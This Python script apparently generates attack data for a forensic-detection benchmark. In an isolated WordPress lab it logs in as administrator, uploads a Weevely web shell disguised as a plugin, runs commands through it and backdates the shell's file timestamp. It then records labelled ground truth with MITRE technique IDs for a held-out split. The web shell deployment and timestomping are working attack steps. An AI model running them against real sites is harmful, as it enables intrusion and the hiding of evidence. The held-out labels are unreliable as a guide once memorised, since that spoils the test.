"""Record a WordPress agent timestomp using Weevely's pinned file module."""

from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import tempfile
import time
import zipfile
from datetime import UTC, datetime
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")
EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
ADMIN_USER = os.environ["BENCH_ADMIN_USER"]
ADMIN_PASSWORD = os.environ["BENCH_ADMIN_PASSWORD"]
AGENT_PASSWORD = os.environ["BENCH_AGENT_PASSWORD"]
PLUGIN = "m8v2-timestomp"
AGENT = "m8v2-s09-agent.php"
REMOTE = f"/var/www/html/wp-content/plugins/{PLUGIN}/{AGENT}"
AGENT_URL = f"{EDGE}/wp-content/plugins/{PLUGIN}/{AGENT}"


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def isolation() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(2400):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded pause")

    headers = {"X-Lab-Client-IP": ATTACKER_IP, "User-Agent": "M8-v2-s09-timestomp"}
    session = requests.Session()
    session.get(f"{EDGE}/wp-login.php", headers=headers, timeout=15)
    login = session.post(
        f"{EDGE}/wp-login.php",
        headers={**headers, "X-Lab-Step": "administrator_login"},
        data={
            "log": ADMIN_USER,
            "pwd": ADMIN_PASSWORD,
            "wp-submit": "Log In",
            "redirect_to": f"{EDGE}/wp-admin/",
            "testcookie": "1",
        },
        timeout=15,
        allow_redirects=False,
    )
    if login.status_code != 302:
        raise RuntimeError("WordPress administrator login failed")

    page = session.get(
        f"{EDGE}/wp-admin/plugin-install.php?tab=upload",
        headers={**headers, "X-Lab-Step": "plugin_upload_form"},
        timeout=15,
    )
    if page.status_code != 200:
        raise RuntimeError("WordPress plugin upload form did not load")
    import re

    nonce = re.search(r'name="_wpnonce"\s+value="([^"]+)"', page.text)
    if nonce is None:
        raise RuntimeError("WordPress plugin upload form nonce was absent")

    with tempfile.TemporaryDirectory(prefix="s09-timestomp-") as temporary:
        package = Path(temporary) / "m8v2-timestomp.zip"
        agent = Path(temporary) / AGENT
        subprocess.run(
            ["weevely", "generate", AGENT_PASSWORD, str(agent)],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        with zipfile.ZipFile(package, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(
                f"{PLUGIN}/{PLUGIN}.php",
                "<?php\n/*\nPlugin Name: M8 v2 S09 timestamp fixture\nVersion: 1.0\n*/\n",
            )
            archive.write(agent, f"{PLUGIN}/{AGENT}")
        with package.open("rb") as package_file:
            upload = session.post(
                f"{EDGE}/wp-admin/update.php?action=upload-plugin",
                data={"_wpnonce": nonce.group(1), "install-plugin-submit": "Install Now"},
                files={"pluginzip": (package.name, package_file, "application/zip")},
                headers={**headers, "X-Lab-Step": "agent_upload"},
                timeout=30,
                allow_redirects=False,
            )
    if upload.status_code != 200 or not any(
        phrase in upload.text for phrase in ("Plugin installed successfully", "Activate Plugin")
    ):
        raise RuntimeError("WordPress rejected the local timestomp fixture archive")

    connected = subprocess.run(
        ["weevely", AGENT_URL, AGENT_PASSWORD, "id"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=20,
    )
    if "www-data" not in connected.stdout:
        raise RuntimeError("the uploaded Weevely agent did not execute")

    started = timestamp()
    touched = subprocess.run(
        [
            "weevely",
            AGENT_URL,
            AGENT_PASSWORD,
            f":file_touch {REMOTE} -epoch-ts 978307200",
        ],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=30,
    )
    ended = timestamp()
    if "2001-01-01" not in touched.stdout:
        raise RuntimeError("Weevely's timestamp module did not confirm the requested mtime")

    records = {
        "scenario_id": "s09",
        "description": (
            "An administrator installs a local fixture archive containing a Weevely agent. "
            "The pinned agent's file timestamp module changes the agent's modification time "
            "to an earlier date and verifies the result."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "agent_timestomp",
        "steps": [
            {
                "id": "administrator_login",
                "category": "valid_account_access",
                "mitre": ["T1078.003"],
                "label_method": "header",
                "expected_in_timeline": False,
            },
            {
                "id": "plugin_upload_form",
                "category": "reconnaissance",
                "mitre": ["T1595"],
                "label_method": "header",
                "expected_in_timeline": False,
            },
            {
                "id": "agent_upload",
                "category": "tool_upload",
                "mitre": ["T1505.003"],
                "label_method": "header",
                "expected_in_timeline": False,
            },
            {
                "id": "agent_timestomp",
                "category": "timestamp_manipulation",
                "mitre": ["T1070.006"],
                "label_method": "attacker_ip_time_window",
                "attacker_ip": ATTACKER_IP,
                "started_at": started,
                "ended_at": ended,
                "request": f"POST /wp-content/plugins/{PLUGIN}/{AGENT} HTTP/1.1",
                "status": 200,
                "candidate_ordinal": 1,
            },
        ],
        "files": [
            {"path": f"/wp-content/plugins/{PLUGIN}/{PLUGIN}.php", "role": "attacker_plugin"},
            {"path": f"/wp-content/plugins/{PLUGIN}/{AGENT}", "role": "webshell_agent"},
            {
                "path": "/wp-content/uploads/wp-file-manager-pro/fm_backup/index.php",
                "role": "side_effect",
                "expected_in_report": False,
            },
        ],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "held_out",
        "expected_rule_ids": [],
    }
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    continuation.write_text("continue\n", encoding="ascii")
    print(json.dumps({"agent_uploaded": True, "timestomp_confirmed": True}))


if __name__ == "__main__":
    {"isolation": isolation, "attack": attack}[sys.argv[1]]()
